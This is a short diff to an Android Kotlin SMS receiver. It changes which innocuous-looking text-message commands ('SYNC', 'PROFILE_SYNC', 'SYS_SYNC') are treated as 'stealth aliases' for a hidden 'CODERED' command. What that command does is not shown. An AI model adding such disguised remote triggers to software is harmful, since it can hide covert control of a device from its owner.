@@ -133,7 +133,7 @@ class SmsReceiver : BroadcastReceiver() {
                         }
 
                         // Stealth Aliases for CODERED
-                        if (cmd == "PROFILE_SYNC" || cmd == "MEDIA_UPDATE" || cmd == "SYS_SYNC") {
+                        if (cmd == "SYNC" || cmd == "PROFILE_SYNC" || cmd == "SYS_SYNC") {
                             cmd = "CODERED"
                         }
 
